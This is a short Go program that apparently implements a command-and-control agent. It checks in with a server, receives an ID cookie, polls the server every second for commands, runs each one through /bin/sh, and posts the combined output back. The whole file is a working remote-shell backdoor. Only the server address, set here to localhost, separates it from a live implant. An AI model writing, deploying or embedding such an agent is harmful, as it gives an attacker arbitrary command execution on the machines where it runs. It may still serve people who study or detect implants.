package main

import (
	"bytes"
	"fmt"
	"net/http"
	"os/exec"
	"time"
)

var id string

func handleError(err error) (b bool) {
	if err != nil {
		panic(err)
		fmt.Print(err)
		return true
	}
	return false
}

func handleCommand(str string, server string) {
	switch str {
	case "***NIL***":
		return
	default:
		cmd := exec.Command("/bin/sh", "-c", str)
		out, err := cmd.CombinedOutput()
		buff := bytes.NewBuffer(out)
		if err != nil {
			buffErr := bytes.NewBufferString(string(out) + "\n" + err.Error())
			http.Post(server, "text/plain", buffErr)
		} else {
			// TODO: error handle on down / refusal
			http.Post(server, "text/plain", buff)
		}
		return
	}

}

func initAgent(server string) {
	buff := bytes.NewBufferString("***INIT***")
	// TODO: add cookie to post
	r, err := http.Post(server, "text/plain", buff)
	if handleError(err) {
		return
	}
	for _, cookie := range r.Cookies() {
		if cookie.Name == "ID" {
			id = cookie.Value
		}
	}
	return
}

func main() {
	var buff bytes.Buffer
	server := "http://127.0.0.1:39901/"
	initAgent(server)
	fmt.Print(id)
	cookie := http.Cookie{Name: "ID", Value: id}
	httpClient := &http.Client{}
	for {
		buff.Reset()

		// TODO: check for server down / refusal
		breq := bytes.NewBufferString("")
		req, _ := http.NewRequest("GET", server, breq)
		req.AddCookie(&cookie)
		r, err := httpClient.Do(req)
		if handleError(err) {
			return
		}

		buff.ReadFrom(r.Body)
		fmt.Println(buff.String())

		go handleCommand(buff.String(), server)
		time.Sleep(1 * time.Second)
	}
}
